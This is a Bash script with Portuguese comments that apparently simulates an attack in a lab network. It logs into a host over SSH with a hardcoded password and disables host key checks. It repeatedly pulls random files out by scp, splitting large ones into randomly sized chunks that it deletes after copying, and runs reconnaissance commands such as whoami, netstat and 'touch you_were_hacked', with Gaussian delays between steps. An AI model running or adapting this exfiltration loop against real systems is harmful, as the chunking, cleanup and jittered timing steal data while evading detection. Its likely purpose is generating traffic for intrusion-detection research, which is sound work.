#!/bin/bash

remote_user="labcom"
remote_host="10.10.10.1"
remote_path="~/Desktop/files" # Diretório remoto a ser acessado
remote_password="labcom"

# Lista de comandos possíveis
commands=("ls" "echo OLA" "pwd" "date" "grep" "touch you_were_hacked" "whoami" "lscpu" "netstat" "ip a" "traceroute")

while true; do

    # Acessar aleatoriamente um arquivo no diretório remoto
    remote_files=( $(sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "cd $remote_path && ls -p | grep -v /") )

    # Verificar se há arquivos disponíveis no diretório remoto
    if [ ${#remote_files[@]} -eq 0 ]; then
        echo "Nenhum arquivo encontrado no diretório remoto."
    else
        # Selecionar aleatoriamente um arquivo do array de arquivos remotos
        random_index=$(( RANDOM % ${#remote_files[@]} ))
        selected_file="${remote_files[$random_index]}"
        
        # Obter o tamanho do arquivo selecionado
        file_size=$(sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "cd $remote_path && du -k $selected_file | cut -f1")
        
		if [ "$file_size" -gt 50 ]; then
			echo "File $selected_file is larger than 50KB, transferring in chunks..."
				
			# Generate a random number between 10 and 16 for split size
			random_size=$(( (RANDOM % 7) + 10 ))

			# Execute the SSH command with the generated random size
			ssh_command="cd $remote_path && split -d -b ${random_size}k $selected_file $selected_file-part"
			sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "$ssh_command" 2>/dev/null

			# Get the list of chunks
			chunks=( $(sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "cd $remote_path && ls $selected_file-part* 2>/dev/null") )

			# Transfer each chunk and remove it from the remote server after transfer
			for chunk in "${chunks[@]}"; do
				echo "Transferring chunk $chunk..."
				sshpass -p "$remote_password" scp -o StrictHostKeyChecking=no "$remote_user"@"$remote_host":"$remote_path/$chunk" .
				echo "Chunk $chunk transferred."
				sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "cd $remote_path && rm $chunk"

				# Insert random delay between chunk transfers
				mean_chunk_delay=30
				deviation_chunk_delay=20
				chunk_delay=$(python -c "import random, math; print(int(random.gauss($mean_chunk_delay, $deviation_chunk_delay)))")
				sleep "$chunk_delay"
			done
	
        else
            # Transferir o arquivo completo se for menor ou igual a 50KB
            echo "Transferring $selected_file..."
            sshpass -p "$remote_password" scp -o StrictHostKeyChecking=no "$remote_user"@"$remote_host":"$remote_path/$selected_file" .
            echo "File $selected_file transferred."
        fi

		#
		num_commands=$(( (RANDOM % 2) + 3 ))

		# Execute random commands within the specified range
		for (( i=1; i<=num_commands; i++ )); do
			random_command=${commands[$RANDOM % ${#commands[@]} ]}
			echo "Executing command remotely: $random_command"
			sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "$random_command"
			mean_command_delay=10
			deviation_command_delay=5
			command_delay=$(python -c "import random, math; print(int(random.gauss($mean_command_delay, $deviation_command_delay)))")
			sleep "$command_delay"
		done
    fi
    
    # Atraso gaussiano entre ataques (com média de 90 segundos e desvio de 60 segundos)
    mean_sleep_delay=90
    deviation_sleep_delay=60
    attack_delay=$(python -c "import random, math; print(int(random.gauss($mean_sleep_delay, $deviation_sleep_delay)))")
    sleep "$attack_delay"
done
